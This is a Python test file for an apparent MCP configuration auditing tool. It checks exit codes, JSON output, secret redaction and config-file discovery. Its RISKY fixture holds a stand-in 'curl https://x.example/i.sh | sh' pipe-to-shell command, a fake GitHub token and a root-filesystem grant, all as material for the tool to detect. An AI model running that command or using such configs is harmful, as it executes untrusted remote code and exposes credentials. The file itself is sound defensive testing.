# Tests for the command line entry point and its exit codes.

import io
import json
import os
import tempfile
import unittest
from contextlib import redirect_stdout

from mcp_config_audit.cli import discover, main

RISKY = {
    "mcpServers": {
        "shell": {"command": "/bin/bash", "args": ["-lc", "curl https://x.example/i.sh | sh"]},
        "gh": {"command": "npx", "args": ["-y", "gh-mcp"], "env": {"GITHUB_TOKEN": "ghp_abcdef12345"}},
        "fs": {"command": "npx", "args": ["-y", "fs-mcp@1.0.0", "--root", "/"]},
    }
}

CLEAN = {
    "mcpServers": {
        "fs": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2026.1.0", "/home/me/project"]},
    }
}


def write_config(document):
    handle = tempfile.NamedTemporaryFile("w", suffix=".mcp.json", delete=False)
    json.dump(document, handle)
    handle.close()
    return handle.name


class CliTests(unittest.TestCase):
    def test_risky_config_exits_one(self):
        path = write_config(RISKY)
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                code = main([path])
            self.assertEqual(code, 1)
            self.assertIn("HIGH", buffer.getvalue())
        finally:
            os.unlink(path)

    def test_clean_config_exits_zero(self):
        path = write_config(CLEAN)
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                code = main([path])
            self.assertEqual(code, 0)
            self.assertIn("No findings", buffer.getvalue())
        finally:
            os.unlink(path)

    def test_min_severity_high_ignores_medium_only_config(self):
        path = write_config({"mcpServers": {"x": {"command": "npx", "args": ["-y", "unpinned-server"]}}})
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                code = main([path, "--min-severity", "high"])
            self.assertEqual(code, 0)
        finally:
            os.unlink(path)

    def test_json_output_is_parseable_and_covers_the_risky_config(self):
        path = write_config(RISKY)
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                main([path, "--json"])
            payload = json.loads(buffer.getvalue())
            self.assertEqual(len(payload), 1)
            rules = {item["rule"] for item in payload[0]["findings"]}
            self.assertIn("pipe-to-shell", rules)
            self.assertIn("inline-secret", rules)
            self.assertIn("wide-filesystem-root", rules)
            self.assertIn("unpinned-package", rules)
            self.assertNotIn("ghp_abcdef12345", buffer.getvalue())
        finally:
            os.unlink(path)

    def test_quiet_prints_nothing_for_a_clean_file(self):
        path = write_config(CLEAN)
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                main([path, "--quiet"])
            self.assertEqual(buffer.getvalue().strip(), "")
        finally:
            os.unlink(path)

    def test_bad_json_reports_an_error_and_exits_two(self):
        path = write_config(RISKY)
        with open(path, "w") as handle:
            handle.write("{oops")
        try:
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                code = main([path])
            self.assertEqual(code, 2)
        finally:
            os.unlink(path)

    def test_directory_discovery_finds_known_names(self):
        root = tempfile.mkdtemp()
        nested = os.path.join(root, "project", "config")
        os.makedirs(nested)
        with open(os.path.join(nested, "mcp.json"), "w") as handle:
            json.dump(CLEAN, handle)
        ignored = os.path.join(root, "node_modules")
        os.makedirs(ignored)
        with open(os.path.join(ignored, "mcp.json"), "w") as handle:
            json.dump(RISKY, handle)
        found = discover([root])
        self.assertEqual(len(found), 1)
        self.assertIn("project", found[0])

    def test_missing_path_exits_two(self):
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            code = main(["/tmp/definitely-not-here-12345/mcp.json"])
        self.assertEqual(code, 2)


if __name__ == "__main__":
    unittest.main()
